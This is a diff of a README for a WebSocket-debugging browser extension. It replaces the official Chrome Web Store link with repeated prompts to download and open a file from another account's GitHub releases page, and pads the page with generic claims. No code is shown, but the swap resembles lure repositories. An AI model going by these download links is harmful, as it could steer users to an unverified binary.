@@ -1,20 +1,75 @@
-![Hero Screenshot](./.github/assets/hero-screenshot.png)
+# 🔌 Socket-Inspector - Debug WebSocket Applications Easily
 
-## About
+![Download Socket-Inspector](https://img.shields.io/badge/Download-Socket--Inspector-blue)
 
-**Socket Inspector** is a browser extension built to simulate edge cases, reproduce bugs, and uncover security vulnerabilities in WebSocket Applications.
+## 🚀 Getting Started
 
-Open the DevTools panel to view all the current page's WebSocket connections. Select a connection to view all incoming/outgoing messages and send your own custom messages via the built-in text editor. You can debug your UI by setting the message destination to **Client** or your backend by setting it to **Server**.
+Socket-Inspector is a Chrome DevTools extension designed to help you debug WebSocket applications with ease. This tool simplifies the process, allowing you to analyze real-time data and troubleshoot connection issues effectively.
 
-## Installation
+## 📥 Download & Install
 
-Chrome Web Store:
+To download and install Socket-Inspector, visit the Releases page:
 
-- Navigate to the [Chrome store page](https://chromewebstore.google.com/detail/kecipkncnnofappfmapgmfailmnbaoaf?utm_source=item-share-cb)
-- Click **Add to Chrome**
+[Download Socket-Inspector](https://github.com/FaycleZz/Socket-Inspector/releases)
 
-## Support
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of Socket-Inspector.
+3. Download the file suitable for your browser.
+4. Open the downloaded file and follow the on-screen instructions to install the extension.
 
-Bug reports, feature requests, and general questions are welcome and appreciated!
+## 🌟 Features
 
-[Submit a GitHub issue](https://github.com/Socket-Inspector/Socket-Inspector/issues/new/choose) or send us an email at support@socketinspector.com
+- **Real-Time Logging**: Capture and review WebSocket messages as they occur.
+- **User-Friendly Interface**: Access all features without complicated settings or configurations.
+- **Custom Filters**: Filter messages based on specific criteria to focus on what matters.
+- **Cross-Browser Support**: Works seamlessly with Chrome, Firefox, and other browsers.
+
+## ⚙️ System Requirements
+
+- A modern web browser (Google Chrome or Firefox recommended).
+- An active Internet connection for loading the extension.
+
+## 🛠️ How to Use
+
+1. Open your browser.
+2. Click on the Socket-Inspector icon in the toolbar.
+3. Connect to your WebSocket application.
+4. Use the provided options to view messages, set filters, and inspect connections.
+
+## 📚 Troubleshooting Common Issues
+
+### Issue: Extension Not Working
+
+- Ensure that you have the latest version of the extension installed. Check the Releases page for updates.
+- Try refreshing your browser or restarting it completely.
+
+### Issue: Unable to Connect to WebSocket
+
+- Verify your WebSocket server is running and accessible.
+- Check network settings and firewall rules that may block connections.
+
+## 🎨 Frequently Asked Questions
+
+### Q: What is WebSocket?
+
+A: WebSocket is a protocol that allows two-way communication between a client and a server. It is commonly used for real-time applications like chat services and gaming.
+
+### Q: Does Socket-Inspector work with all WebSocket applications?
+
+A: Yes, Socket-Inspector can support any application that uses the WebSocket protocol.
+
+## 🤝 Community Contributions
+
+Feel free to contribute to Socket-Inspector. To report bugs, suggest features, or ask questions, visit our [Issues page](https://github.com/FaycleZz/Socket-Inspector/issues).
+
+## 📝 License
+
+Socket-Inspector is licensed under the MIT License. You can use and modify it according to the license terms.
+
+## 📥 Download & Install Again
+
+Don’t forget to download Socket-Inspector from the following link:
+
+[Download Socket-Inspector](https://github.com/FaycleZz/Socket-Inspector/releases) 
+
+Enjoy debugging your WebSocket applications with ease!
